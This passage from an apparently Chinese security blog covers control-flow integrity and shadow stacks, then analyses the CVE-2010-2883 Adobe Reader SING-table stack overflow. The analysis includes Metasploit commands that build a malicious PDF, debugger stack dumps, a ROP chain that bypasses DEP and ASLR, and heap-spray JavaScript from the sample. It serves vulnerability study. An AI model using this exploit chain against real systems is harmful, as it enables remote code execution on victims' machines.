总结下大概早起防范就是金丝雀，和NX保护，以及代码段的随机化。canary保护其实挺强的了，一般的栈溢出是可以做到防护的，但是如果存在类似于任意地址写，格式化字符串漏洞等，还是无法避免返回地址被劫持。 2 CFI概述CFI关注的是间接指令，所以在这里对汇编语言中不同寻址方式的指令进行补充说明。 在汇编语言中，根据寻址方式的不同可以分为两种跳转指令。一种是间接跳转指令，另一种是直接跳转指令。 直接跳转指令的示例如下所示: 1CALL 0x1060000F 在程序执行到这条语句时，就会将指令寄存器的值替换为0x1060000F。这种在指令中直接给出跳转地址的寻址方式就叫做直接转移。在高级语言中, 像if-else，静态函数调用这种跳转目标往往可以确定的语句就会被转换为直接跳转指令。 间接跳转指令则是使用数据寻址方式间接的指出转移地址，如: 1JMP EBX 执行完这条指令之后，指令寄存器的值就被替换为EBX寄存器的值。它的转换对象为作为回调参数的函数指针等动态决定目标地址的语句。 在CFI中还有一个比较特殊的分类方式，就是前向和后向转移。将控制权定向到程序中一个新位置的转移方式， 就叫做前向转移, 比如jmp和call指令；而将控制权返回到先前位置的就叫做后向转移，最常见的就是ret指令。 将以上两种分类方式结合起来，前向转移指令call和jmp根据寻址方式不同又可以分为直接jmp, 间接jmp，直接call，间接call四种。而后向转移指令ret没有操作数，它的目标地址计算是通过从栈中弹出的数来决定的。正因为ret指令的特性，引发了一系列针对返回地址的攻击。 2.2 核心思想限制程序运行中的控制转移，使之始终处于原有的控制流图所限定的范围内。它规定软件执行必须遵循提前确定的控制流图（CFG）的路径。 通过分析程序的控制流图，获取间接转移指令（包括间接跳转、间接调用、和函数返回指令）目标的白名单，并在运行过程中，核对间接转移指令的目标是否在白名单中。 通过二进制代码重写实现：插桩—— IDs ID检查 利用二进制重写技术向软件函数入口及调用返回处分别插入标识符ID和ID_check，通过对比ID和ID_check的值是否一致判断软件的函数执行过程是否符合预期，从而判断软件是否被篡改。 2.3 示例：通过插桩执行CFICFI要求在程序执行期间，只要机器代码指令转移控制，只能转移到有效目标，这是由提前创建的CFG确定的。 文中提到，期望在不久的将来部署硬件CFI支持是不现实的，所以该文章仅讨论软件CFI实现（也是有局限性的，在提出和发展那篇里曾提到）。内联CFI插桩可以在当前处理器上的软件中实现，特别是在x86处理器上，只需要适度的开销。 CFI插桩根据给定的CFG修改每个源指令和计算控制流传输的每个可能的目标指令。 示例： 左侧是一个C程序片段，其中函数sort2调用sort的函数排序两次，首先使用lt，然后使用gt。它们作为指向比较函数的指针。右侧显示了这四个函数的二进制代码块的轮廓以及它们之间的所有CFG边。 直接调用的边为浅色虚线箭头 源指令的边为实线箭头 返回边为虚线箭头 因此，CFI检测包括sort2主体中的两个ID，以及从排序返回时的ID检查，使用55（这里是随意使用55来表示）作为ID位模式。同样，因为sort可以调用lt 或者gt，两个比较函数都以ID 17开头; 并且使用寄存器R中的函数指针的调用指令对17执行ID检查。最后，ID 23在sort中标识比较调用点之后的块，因此两个比较函数都检查返回ID 23。 CFI检测不会影响直接函数调用：只有间接调用需要ID检查，并且只有间接调用的函数（例如虚方法）才需要添加ID。 函数返回多个ID检查时，必须在每个函数调用点之后插入ID，无论该函数是否间接调用。剩余的计算控制流通常是switch语句和异常的结果。在两种情况下，每个可能的目标都需要一个ID，并且在发送点需要ID检查。 2.4 CFI插桩代码选择特定的二进制码序列实现ID和ID检查。 上图中，这里，目标已在ecx中，所以ID检查不必将其移动到寄存器（通常ID检查需要这样做来避免竞争条件）。跳转指令jmp ecx的目标可能是来自堆栈的mov（下图所示）。 在（a）中，ID作为数据插入到目标mov指令之前，并且ID检查使用lea指令修改计算的目标，以跳过四个ID字节。ID检查直接将原始目的地与ID值进行比较。ID位模式嵌入在ID-check cmp操作码字节内。 因此，在（a）中，可能以某种方式影响ecx寄存器的值的攻击者可能会导致跳转到jne指令而不是预期的目标。 （b）通过在ID检查中使用ID-1作为常量并将其递增以在运行时计算ID来避免（a）的微妙之处。 另外，替代方案（b）不修改计算的跳转目标，而是有效地在目标的开始处插入labelID：使用无副作用的x86预取指令来合成labelID指令。（其实这个b我不太懂那个inc eax这个的作用) 2.5 CFI的三个重要假设实现CFI，三个假设成立至关重要。 这三个假设是： UNQ. 唯一ID：在CFI检测之后，除了ID和ID检查之外，选择为ID的位模式不得出现在代码存储器中的任何位置。通过使ID足够大（例如32位，对于合理大小的软件）并且通过选择ID使得它们不与软件的其余部分中的操作码字节冲突，可以容易地实现该属性。 NWC. 不可写代码：程序必须无法在运行时修改代码内存。否则，攻击者可能能够绕过CFI，例如通过覆盖ID检查。除了在加载动态库和运行时代码生成期间，NWC在大多数当前系统中已经是正确的。 NXD. 不可执行数据：程序必须不能像执行代码那样执行数据。否则，攻击者可能会导致执行标有预期ID的数据。最新的x86处理器上的硬件支持NXD，Windows XP SP2使用此支持来强制分离代码和数据[Microsoft Corporation 2004]。 NXD也可以用软件实现[PaX Project 2004]。NXD本身（没有CFI）阻止了一些攻击，但不适于那些利用预先存在的代码的攻击，例如“jump-to-libc”攻击。 2.6 CFI执行的阶段第一阶段，即用于CFI执行的CFG的构建，从程序分析到安全策略规范。实际实施可以使用标准控制流分析技术（例如，[Aho et al. 1985; Atkinson 2002; Wagner and Dean 2001]）。 在CFI检测之后（可能在安装时），另一种机制可以建立UNQ假设。无论何时安装或修改软件，都可以更新ID以保持唯一性，就像某些操作系统中的预绑定信息一样[Apple Computer 2003]。 最后，CFI验证阶段可以静态验证直接跳转和类似指令，正确插入ID和ID检查以及UNQ属性。验证可以看作是PCC校对检查的一个特例，其中插桩不需要明确的逻辑校验。建立CFI只需要验证：设备中的设计或实施缺陷不会危及安全性。 2.7 CFI实施 Vulcan [Srivastava et al.2001]：一个成熟的、最先进的x86二进制文件检测系统，既不需要重新编译也不需要源代码访问。该系统以实用的方式解决了二进制代码重写的挑战。 使用Vulcan来构建正在检测的程序的CFG。这个CFG构造正确处理执行计算控制流传输的x86指令，包括函数返回，通过函数指针调用，以及为switch语句和动态调度发出的指令。每个计算出的调用指令可以转到任何采用其地址的函数：通过对二进制文件中的重定位条目进行流不敏感分析来发现这些函数。 3 影子栈当启用影子堆栈时，Near CALL压入返回地址到数据堆栈和影子堆栈上；Near RET 从影子堆栈和数据堆栈弹出返回地址。 如果指定了可选的“n”操作数，则数据堆栈指针（ESP / RSP）可选地进一步增加“n”个字节，但是影子堆栈指针（SSP）不递增。如果从两个堆栈弹出的返回地址不相同，那么处理器会导致#CP（near-ret）异常。","tags":[{"name":"保护措施","slug":"保护措施","permalink":"wood1314.github.io/tags/保护措施/"}]},{"title":"CVE-2010-2883 Adobe Reader TFF字体SING表栈溢出","date":"2020-06-04T12:20:05.000Z","path":"year/06/04/cl6ewld8s000lj63fvluo24ag/","text":"在Adobe Reader和Acrobat 9.4之前的9.x版本中用于实现CoolType(清晰显示文本的字体还原技术)技术的库CoolType.dll中在解析TrueType字体文件中的SING表的uniqueName字段时调用的strcat函数未检查长度导致存在基于栈的缓冲区溢出漏洞。远程攻击者可构造恶意的SmartINdependent Glyphlets (SING)表修改内存数据从而执行任意代码。 漏洞信息漏洞编号: CVE-2010-2883 复现环境: 操作系统 Windows XP SP3 虚拟机 Vmware 15 Pro 漏洞软件 Adobe Reader 9.3.4 样本生成这里我们先借助Metasploit帮助我们生成一个样本用于动态调试(之后会分析这个样本是如何构造出来的)。 1msfconsole 首先在Kali中调用msfconsole唤出我们的msf。 1msf &gt; search cve-2010-2883 搜索cve-2010-2883漏洞编号可以列出可用的exploit。 我是unbuntu系统，这个文件在/opt目录下 然后找/metasploit-framework/modules/exploits/windows/fileformat/adobe_cooltype_sing.rb 为了便于等下动态调试识别一些关键数据块，我们考虑修改一下这个exploit的一处地方。 在这个exploit的102行处，将下面这句代码 1sing &lt;&lt; rand_text(0x254 - sing.length) 改为 1sing &lt;&lt; &quot;A&quot; * (0x254 - sing.length) 这里的rand_text主要作用是取随机字符，目的是为了增强样本的随机性从而躲避一些检测。这里我们只做研究之用，所以不必随机。修改之后保存 使用这个exp 1msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; set payload windows/exec 然后设置有效载荷为windows/exec用来执行命令 1msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; set cmd calc.exe 设置为启动计算器 1msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; set filename cve20102883.pdf 最后设置一下生成的样本文件名 1msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; exploit 执行一下，样本就被生成在了 /root/.msf4/local/cve20102883.pdf 然后拷贝出来放到Windows SP3虚拟机上的复现环境中。 静态分析由于已经知道是SING处出了问题，那么用ida直接查找字符串，定位到这里，漏洞函数就是strcat。 1234567891011121314151617181920212223.text:0803DD74 push offset aSing ; &quot;SING&quot;.text:0803DD79 push edi ; int.text:0803DD7A lea ecx, [ebp+108h+var_12C].text:0803DD7D call sub_8021B06.text:0803DD82 mov eax, [ebp+108h+var_12C].text:0803DD85 cmp eax, esi.text:0803DD85 ; &#125; // starts at 803DD53.text:0803DD87 ; try &#123;.text:0803DD87 mov byte ptr [ebp+108h+var_10C], 2.text:0803DD8B jz short loc_803DDC4.text:0803DD8D mov ecx, [eax].text:0803DD8F and ecx, 0FFFFh.text:0803DD95 jz short loc_803DD9F.text:0803DD97 cmp ecx, 100h.text:0803DD9D jnz short loc_803DDC0.text:0803DD9F.text:0803DD9F loc_803DD9F: ; CODE XREF: sub_803DCF9+9C↑j.text:0803DD9F add eax, 10h.text:0803DDA2 push eax ; char *.text:0803DDA3 lea eax, [ebp+108h+var_108].text:0803DDA6 push eax ; char *.text:0803DDA7 mov [ebp+108h+var_108], 0.text:0803DDAB call strcat 先分析strcat的参数，第一个参数是栈上一个地址，字符串拼接后会把字符拼接到这里，可以看到前面并没有对长度进行限制。 第二个参数盲猜应该是我们构造的rop链的地址了。 动态调试在复现环境中把Adobe Reader 9.3.4 启动程序载入OllyDbg。加载之后F9运行。此时OllyDbg显示当前调试的程序是运行状态，实际上这个时候Adobe Reader就已经加载了CoolType.dll文件了。通过刚刚的静态分析我们了解到aSing在地址0x0803DD74处被引用。因此我们可以先在OD中在这个地址处下一个断点。快捷键Ctrl+G输入0x0803DD74回车跳转到该地址F2下断点。 我们将刚才的样本拖入到Adobe Reader中。程序就会停在刚才下的断点上面。 F7单步到 10803DD7A 8D4D DC lea ecx,dword ptr ss:[ebp-0x24] 执行这句指令之后我们来看看ecx到底存了什么。此时的ecx = 0x0012E4B4，首先猜测这是一个指针地址，定位到数据区域之后，取出前32位的十六进制。 10012E4B4 F4 41 6D 04 由于在X86架构下是小端字节序，因此我们将数据排列成0x046D41F4。这应该就是ecx指针所指向的地址，定位到数据区域。可以看到如下数据 在分析这段数据之前我们先来看看TrueType字体格式标准文档里是怎么说的。 在TrueType字体文件中，从0字节偏移的位置开始处有一个表目录。且这个表目录的第一个字段是名为sfnt version是用来表明所用ttf格式版本的字段。在文档中清楚的标注了，对于1.0版本的TTF字体文件开头要用0x00010000来表示版本。回到我们刚才0x046D41F4位置处的数据，会发现开头正好是0x00010000，这就证明了ecx保存的是一个指向ttf对象的指针地址并且在这里应该是作为this指针。 分析到这里，继续我们的动态调试。接下来遇到了一个call指令，意味着即将调用一个函数。在调用函数前我们不妨先看看这个函数传入了哪些参数。 120803DD74 68 4CDB1908 push CoolType.0819DB4C ; ASCII &quot;SING&quot;0803DD79 57 push edi 很明显它将SING字符串当作参数了。这里我们单步F8不进入call函数内部。 120803DD7D E8 843DFEFF call CoolType.08021B060803DD82 8B45 DC mov eax,dword ptr ss:[ebp-0x24] 来看看这里的eax变成了什么。 eax = 0x046BE598 数据窗口跟随就会发现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374046BE598 00 00 01 00 01 0E 00 01 ....046BE5A0 00 00 00 00 00 00 00 3A .......:046BE5A8 41 41 41 41 41 41 41 41 AAAAAAAA046BE5B0 14 A7 82 4A 0C 0C 0C 0C J....046BE5B8 41 41 41 41 41 41 41 41 AAAAAAAA046BE5C0 41 41 41 41 41 41 41 41 AAAAAAAA046BE5C8 41 41 41 41 41 41 41 41 AAAAAAAA046BE5D0 41 41 41 41 41 41 41 41 AAAAAAAA046BE5D8 41 41 41 41 41 41 41 41 AAAAAAAA046BE5E0 41 41 41 41 41 41 41 41 AAAAAAAA046BE5E8 41 41 41 41 41 41 41 41 AAAAAAAA046BE5F0 41 41 41 41 41 41 41 41 AAAAAAAA046BE5F8 41 41 41 41 41 41 41 41 AAAAAAAA046BE600 41 41 41 41 41 41 41 41 AAAAAAAA046BE608 41 41 41 41 41 41 41 41 AAAAAAAA046BE610 41 41 41 41 41 41 41 41 AAAAAAAA046BE618 41 41 41 41 41 41 41 41 AAAAAAAA046BE620 41 41 41 41 41 41 41 41 AAAAAAAA046BE628 41 41 41 41 41 41 41 41 AAAAAAAA046BE630 41 41 41 41 41 41 41 41 AAAAAAAA046BE638 41 41 41 41 41 41 41 41 AAAAAAAA046BE640 41 41 41 41 41 41 41 41 AAAAAAAA046BE648 41 41 41 41 41 41 41 41 AAAAAAAA046BE650 41 41 41 41 41 41 41 41 AAAAAAAA046BE658 41 41 41 41 41 41 41 41 AAAAAAAA046BE660 41 41 41 41 41 41 41 41 AAAAAAAA046BE668 41 41 41 41 41 41 41 41 AAAAAAAA046BE670 41 41 41 41 41 41 41 41 AAAAAAAA046BE678 41 41 41 41 41 41 41 41 AAAAAAAA046BE680 41 41 41 41 41 41 41 41 AAAAAAAA046BE688 41 41 41 41 41 41 41 41 AAAAAAAA046BE690 41 41 41 41 41 41 41 41 AAAAAAAA046BE698 41 41 41 41 41 41 41 41 AAAAAAAA046BE6A0 41 41 41 41 41 41 41 41 AAAAAAAA046BE6A8 41 41 41 41 41 41 41 41 AAAAAAAA046BE6B0 41 41 41 41 41 41 41 41 AAAAAAAA046BE6B8 41 41 41 41 41 41 41 41 AAAAAAAA046BE6C0 41 41 41 41 41 41 41 41 AAAAAAAA046BE6C8 41 41 41 41 41 41 41 41 AAAAAAAA046BE6D0 41 41 41 41 41 41 41 41 AAAAAAAA046BE6D8 C6 08 8A 4A 41 41 41 41 ?奐AAAA046BE6E0 41 41 41 41 41 41 41 41 AAAAAAAA046BE6E8 41 41 41 41 41 41 41 41 AAAAAAAA046BE6F0 41 41 41 41 41 41 41 41 AAAAAAAA046BE6F8 41 41 41 41 41 41 41 41 AAAAAAAA046BE700 41 41 41 41 41 41 41 41 AAAAAAAA046BE708 41 41 41 41 41 41 41 41 AAAAAAAA046BE710 41 41 41 41 41 41 41 41 AAAAAAAA046BE718 41 41 41 41 41 41 41 41 AAAAAAAA046BE720 41 41 41 41 41 41 41 41 AAAAAAAA046BE728 41 41 41 41 41 41 41 41 AAAAAAAA046BE730 41 41 41 41 41 41 41 41 AAAAAAAA046BE738 41 41 41 41 41 41 41 41 AAAAAAAA046BE740 41 41 41 41 41 41 41 41 AAAAAAAA046BE748 41 41 41 41 41 41 41 41 AAAAAAAA046BE750 41 41 41 41 41 41 41 41 AAAAAAAA046BE758 41 41 41 41 41 41 41 41 AAAAAAAA046BE760 41 41 41 41 41 41 41 41 AAAAAAAA046BE768 41 41 41 41 41 41 41 41 AAAAAAAA046BE770 41 41 41 41 41 41 41 41 AAAAAAAA046BE778 41 41 41 41 41 41 41 41 AAAAAAAA046BE780 41 41 41 41 41 41 41 41 AAAAAAAA046BE788 41 41 41 41 41 41 41 41 AAAAAAAA046BE790 41 41 41 41 41 41 41 41 AAAAAAAA046BE798 41 41 41 41 41 41 41 41 AAAAAAAA046BE7A0 38 CB 80 4A 41 41 41 41 8藔JAAAA046BE7A8 41 41 41 41 41 41 41 41 AAAAAAAA046BE7B0 41 41 41 41 41 41 41 41 AAAAAAAA046BE7B8 41 41 41 41 41 41 41 41 AAAAAAAA046BE7C0 41 41 41 41 41 41 41 41 AAAAAAAA046BE7C8 41 41 41 41 41 41 41 41 AAAAAAAA046BE7D0 41 41 41 41 41 41 41 41 AAAAAAAA046BE7D8 41 41 41 41 41 41 41 41 AAAAAAAA046BE7E0 41 41 41 41 6C AAAAl 这里大量的A原本都是随机字符，由于刚才我们修改了exploit的代码因此使得这里的数据块更容易辨认。实际上这些数据都是样本中SING表里构造好的恶意数据。 123450803DD74 68 4CDB1908 push CoolType.0819DB4C ; ASCII \"SING\"0803DD79 57 push edi0803DD7A 8D4D DC lea ecx,dword ptr ss:[ebp-0x24]0803DD7D E8 843DFEFF call CoolType.08021B060803DD82 8B45 DC mov eax,dword ptr ss:[ebp-0x24] 因此总结一下，以上的指令主要就是将SING表的tag名传入到08021B06函数中通过表目录来获取到SING表的入口地址，而目前eax的值0x046BE598即是SING表的入口地址。分析SING表的这些数据，我们就能知道样本到底做了些什么。 继续往下动态调试，会发现关键的溢出点。 123450803DDA2 50 push eax0803DDA3 8D45 00 lea eax,dword ptr ss:[ebp]0803DDA6 50 push eax0803DDA7 C645 00 00 mov byte ptr ss:[ebp],0x00803DDAB E8 483D1300 call &lt;jmp.&amp;MSVCR80.strcat&gt; 第一个pusheax 将刚刚获取到的SING表入口地址压入栈区。第二个 pusheax获取了当前栈区的ebp地址即要连接字符串的目的地址。我们单步过strcat之后，查看一下ebp开始的栈区数据。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431440012E4D8 414141410012E4DC 414141410012E4E0 4A82A714 icucnv36.4A82A7140012E4E4 0C0C0C0C0012E4E8 414141410012E4EC 414141410012E4F0 414141410012E4F4 414141410012E4F8 414141410012E4FC 414141410012E500 414141410012E504 414141410012E508 414141410012E50C 414141410012E510 414141410012E514 414141410012E518 414141410012E51C 414141410012E520 414141410012E524 414141410012E528 414141410012E52C 414141410012E530 414141410012E534 414141410012E538 414141410012E53C 414141410012E540 414141410012E544 414141410012E548 414141410012E54C 414141410012E550 414141410012E554 414141410012E558 414141410012E55C 414141410012E560 414141410012E564 414141410012E568 414141410012E56C 414141410012E570 414141410012E574 414141410012E578 414141410012E57C 414141410012E580 414141410012E584 414141410012E588 414141410012E58C 414141410012E590 414141410012E594 414141410012E598 414141410012E59C 414141410012E5A0 414141410012E5A4 414141410012E5A8 414141410012E5AC 414141410012E5B0 414141410012E5B4 414141410012E5B8 414141410012E5BC 414141410012E5C0 414141410012E5C4 414141410012E5C8 414141410012E5CC 414141410012E5D0 414141410012E5D4 414141410012E5D8 414141410012E5DC 414141410012E5E0 414141410012E5E4 414141410012E5E8 414141410012E5EC 414141410012E5F0 414141410012E5F4 414141410012E5F8 414141410012E5FC 414141410012E600 414141410012E604 414141410012E608 4A8A08C6 icucnv36.4A8A08C60012E60C 414141410012E610 414141410012E614 414141410012E618 414141410012E61C 414141410012E620 414141410012E624 414141410012E628 414141410012E62C 414141410012E630 414141410012E634 414141410012E638 414141410012E63C 414141410012E640 414141410012E644 414141410012E648 414141410012E64C 414141410012E650 414141410012E654 414141410012E658 414141410012E65C 414141410012E660 414141410012E664 414141410012E668 414141410012E66C 414141410012E670 414141410012E674 414141410012E678 414141410012E67C 414141410012E680 414141410012E684 414141410012E688 414141410012E68C 414141410012E690 414141410012E694 414141410012E698 414141410012E69C 414141410012E6A0 414141410012E6A4 414141410012E6A8 414141410012E6AC 414141410012E6B0 414141410012E6B4 414141410012E6B8 414141410012E6BC 414141410012E6C0 414141410012E6C4 414141410012E6C8 414141410012E6CC 414141410012E6D0 4A80CB38 返回到 icucnv36.4A80CB38 来自 icucnv36.4A846C490012E6D4 414141410012E6D8 414141410012E6DC 414141410012E6E0 414141410012E6E4 414141410012E6E8 414141410012E6EC 414141410012E6F0 414141410012E6F4 414141410012E6F8 414141410012E6FC 414141410012E700 414141410012E704 414141410012E708 414141410012E70C 41414141 指向下一个 SEH 记录的指针0012E710 41414141 SE处理程序0012E714 0000006C 此时栈溢出已经发生，栈区数据已经被修改成了SING表中构造的恶意数据(实际上是从uniqueName字段开始的数据)。 继续往下分析，我们希望了解程序到底是怎么样去读取栈区数据的。 10808B308 FF10 call dword ptr ds:[eax] 执行到0x0808B308时，我们发现了一个很有意思的地方。即调用了[eax]地址指向的函数。此时的eax = 0012E6D0，这正好处于我们刚才覆盖的栈区数据范围内。 且 [eax]= 0x4A80CB38。 1234A80CB38 81C5 94070000 add ebp,0x7944A80CB3E C9 leave (mov esp,ebp pop ebp)4A80CB3F C3 retn 首先调整了ebp。原本的ebp = 0x0012DD48 ebp+0x794 = 0x0012E4DC 重新将ebp调整进了覆盖的栈区数据范围内。接下来执行的leave，修改了esp，原本的esp = 0x0012DD24 esp = ebp = 0x0012E4DC [esp] = 0x41414141 并且弹栈之后 ebp = 0x41414141 最后retn时，esp = 0x0012E4E0 [esp] = 0x4A82A714 因此接下来EIP = 0x4A82A714 124A82A714 5C pop esp ; 0C0C0C0C4A82A715 C3 retn 这里原本的esp= 0x0012E4E4 [esp] = 0x0C0C0C0C pop esp之后 esp = 0x0C0C0C0C 跳转地址的稳定性其实主要依靠0x4A82A714和0x4A80CB38这两处的地址，他们都位于icucnv36.dll的地址，而在Aodobe Reader的各种版本上，这个dll上的这两处地址是始终不变的，因而保持了各版本的兼容性和Exp的稳定性。上面的0C0C0C0C正是样本特意构造的，然后通过嵌入到pdf的JavaScripe实现Heap Spary,进而跳入shellcode执行代码。0x0C0C0C0C正是绕过DEP的关键部分 让我们看下0x0C0C0C0C处的内容,也就是我们接下来要执行的ROP链 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677780C0C0C0C 4A8063A5 icucnv36.4A8063A50C0C0C10 4A8A0000 icucnv36.4A8A00000C0C0C14 4A802196 icucnv36.4A8021960C0C0C18 4A801F90 icucnv36.4A801F900C0C0C1C 4A84903C &lt;&amp;KERNEL32.CreateFileA&gt;0C0C0C20 4A80B692 icucnv36.4A80B6920C0C0C24 4A801064 icucnv36.4A8010640C0C0C28 4A8522C8 icucnv36.4A8522C80C0C0C2C 10000000 sqlite.100000000C0C0C30 000000000C0C0C34 000000000C0C0C38 000000020C0C0C3C 000001020C0C0C40 000000000C0C0C44 4A8063A5 icucnv36.4A8063A50C0C0C48 4A801064 icucnv36.4A8010640C0C0C4C 4A842DB2 icucnv36.4A842DB20C0C0C50 4A802AB1 icucnv36.4A802AB10C0C0C54 000000080C0C0C58 4A80A8A6 icucnv36.4A80A8A60C0C0C5C 4A801F90 icucnv36.4A801F900C0C0C60 4A849038 &lt;&amp;KERNEL32.CreateFileMappingA&gt;0C0C0C64 4A80B692 icucnv36.4A80B6920C0C0C68 4A801064 icucnv36.4A8010640C0C0C6C FFFFFFFF0C0C0C70 000000000C0C0C74 000000400C0C0C78 000000000C0C0C7C 00010000 UNICODE &quot;=::=::\\&quot;0C0C0C80 000000000C0C0C84 4A8063A5 icucnv36.4A8063A50C0C0C88 4A801064 icucnv36.4A8010640C0C0C8C 4A842DB2 icucnv36.4A842DB20C0C0C90 4A802AB1 icucnv36.4A802AB10C0C0C94 000000080C0C0C98 4A80A8A6 icucnv36.4A80A8A60C0C0C9C 4A801F90 icucnv36.4A801F900C0C0CA0 4A849030 &lt;&amp;KERNEL32.MapViewOfFile&gt;0C0C0CA4 4A80B692 icucnv36.4A80B6920C0C0CA8 4A801064 icucnv36.4A8010640C0C0CAC FFFFFFFF0C0C0CB0 000000220C0C0CB4 000000000C0C0CB8 000000000C0C0CBC 00010000 UNICODE &quot;=::=::\\&quot;0C0C0CC0 4A8063A5 icucnv36.4A8063A50C0C0CC4 4A8A0004 UNICODE &quot;社&quot;0C0C0CC8 4A802196 icucnv36.4A8021960C0C0CCC 4A8063A5 icucnv36.4A8063A50C0C0CD0 4A801064 icucnv36.4A8010640C0C0CD4 4A842DB2 icucnv36.4A842DB20C0C0CD8 4A802AB1 icucnv36.4A802AB10C0C0CDC 000000300C0C0CE0 4A80A8A6 icucnv36.4A80A8A60C0C0CE4 4A801F90 icucnv36.4A801F900C0C0CE8 4A8A0004 UNICODE &quot;社&quot;0C0C0CEC 4A80A7D8 返回到 icucnv36.uprv_timezone_3_6+6 来自 msvcr80.__timezone0C0C0CF0 4A8063A5 icucnv36.4A8063A50C0C0CF4 4A801064 icucnv36.4A8010640C0C0CF8 4A842DB2 icucnv36.4A842DB20C0C0CFC 4A802AB1 icucnv36.4A802AB10C0C0D00 000000200C0C0D04 4A80A8A6 icucnv36.4A80A8A60C0C0D08 4A8063A5 icucnv36.4A8063A50C0C0D0C 4A801064 icucnv36.4A8010640C0C0D10 4A80AEDC icucnv36.4A80AEDC0C0C0D14 4A801F90 icucnv36.4A801F900C0C0D18 000000340C0C0D1C 4A80D585 icucnv36.4A80D5850C0C0D20 4A8063A5 icucnv36.4A8063A50C0C0D24 4A801064 icucnv36.4A8010640C0C0D28 4A842DB2 icucnv36.4A842DB20C0C0D2C 4A802AB1 icucnv36.4A802AB10C0C0D30 0000000A0C0C0D34 4A80A8A6 icucnv36.4A80A8A60C0C0D38 4A801F90 icucnv36.4A801F900C0C0D3C 4A849170 &lt;&amp;MSVCR80.memcpy&gt;0C0C0D40 4A80B692 icucnv36.4A80B692 继续动态分析。此时即将执行retn，而esp指向的地址是0x0c0c0c0c，即 10C0C0C0C 4A8063A5 icucnv36.4A8063A5 再继续动态分析之前，不妨先猜一下会发生什么，以免我们在浩瀚的汇编代码中迷失自己 可以从shellcode中看到我们主要指令了这么几个函数 1234&lt;&amp;KERNEL32.CreateFileA&gt;&lt;&amp;KERNEL32.CreateFileMappingA&gt;&lt;&amp;KERNEL32.MapViewOfFile&gt;&lt;&amp;MSVCR80.memcpy&gt; 接下来继续动态调试 上面给eax复制为CreateFile的函数指针，后面开始调用这个函数 这里直接跳转到eax保存的指针所指向的地址(0x7C801A28)处 单步执行到CreateFileW处，查看栈中参数 **** 这里都是CreateFileA的参数，来看看CreateFileA官方文档给出的结构 123456789HANDLE CreateFileA( LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile); lpFileName用于指定被创建文件的文件名。 dwDesiredAccess 用于指定访问权限一般都是读、写之类的。这里的GENERIC_ALL指的是采用所有可能的访问权限。 dwShareMode 用于指定请求的文件或设备的共享模式，这里指定的0代表了阻止其他进程在请求删除，读取或写入访问权限时打开文件或设备。 lpSecurityAttributes 用于设置安全描述符和子进程是否可继承，这个属性可为NULL，这里用的就是NULL。 dwCreationDisposition 设置对文件执行的操作。这里的CREATE_ALWAYS代表总是会创建文件，即使目标文件已存在也会覆盖它。 dw FlagsAndAttributes 设置文件或设备属性和标志，这里给的值是FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY 代表该文件用于临时存储。 hTemplateFile 设置具有GENERIC_READ访问权限的模板文件的有效句柄。这个属性这里也没用到直接指定NULL。 总之这里创建了一个临时文件，文件名是iso88591。可以在当前样本pdf同目录下找到。 返回后用相同的方法构造处rop指令来调用CreateFileMappping，创建文件内存映射 参数为 然后执行MapViewOfFile函数 再通过类似的方法调用mmap 其中目的地址就是前面MapViewOfFile返回的地址，而源地址就是真正的ShellCode代码，将他复制到一段可执行可读写的内存段，以此绕过DEP保护。由于构造的ROP指令均位于不受ASLR保护的icucnv36.dll模块，因此也可绕过ASLR保护。 总结一下这部分由堆喷射覆盖在栈上的数据都做了一些什么。主要做了新建临时文件，将文件映射到内存，将真正的shellcode拷贝到内存的某一块区域并且解码这些shellcode然后执行。 JavaScript实现HeapSprayPDFStreamDumper打开恶意pdf文件，在第一个object处找到OpenAction，表示其在第11个obj中，PDF运行时会执行里面脚本 进入第11个obj，表示执行的js代码位于第12个obj中 进入12obj，发现实现堆喷射的js脚本 12345678910111213var shellcode = unescape( '%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%······30%u1602%u50d3' );var block = unescape( \"%\" + \"u\" + \"0\" + \"c\" + \"0\" + \"c\" + \"%u\" + \"0\" + \"c\" + \"0\" + \"c\" );while (block.length + 20 + 8 &lt; 65536) block+=block;SP = block.substring(0, (0x0c0c-0x24)/2);SP += shellcode;SP += block;slackspace = SP.substring(0, 65536/2);while(slackspace.length &lt; 0x80000) slackspace += slackspace;bigblock = slackspace.substring(0, 0x80000 - (0x1020-0x08) / 2);var memory = new Array();for (count=0;count&lt;0x1f0;count++) memory[cout]=bigblock+\"s\"; 所有的shellcode都被转化成了十六进制的转义序列，经过unescape解码之后存储在了var_shellcode之中。var_c变量存储了“%u0c0c%u0c0c”，接下来用了一个while循环叠加block，用于覆盖内存中的数据，采用0x0c0c0c0c的原因是因为它所对应的指令是 1or al,0x0C 这样的指令执行的效果对al寄存器不会产生任何影响很适合当作滑板指令是堆喷射的常用技巧。 接下来的SP保存了前面的所有滑板指令以及shellcode。最关键的实现堆喷射的语句是new Array() 利用数组来开辟内存区域，然后通过填充数组数据的方式来喷射shellcode。 PDF格式&amp;样本构造先回顾一下漏洞的触发点，漏洞的触发点是在解析TTF字体的SING表时出现的问题。那很显然我们首先要了解一下TTF的格式定义以及SING表的具体字段。同时我们还需要了解PDF格式规范当中是如何来引用TTF字体文件的，以及PDF是怎么支持JavaScript脚本执行的。 先来了解一下PDF的基本格式 首先看到的是Header部分。这是PDF文件的开始部分。主要用来指明当前PDF文件所遵循的PDF格式标准版本。例如%PDF-1.5 Body部分包含了PDF文档的主要内容，所有向用户展现的内容都在此存放。 Cross-reference table 即交叉引用表，包含了当前PDF文档中所有对象的引用、偏移量以及字节长度。借助这个引用表可以在全文档范围内随机访问任何一个对象，非常的方便。 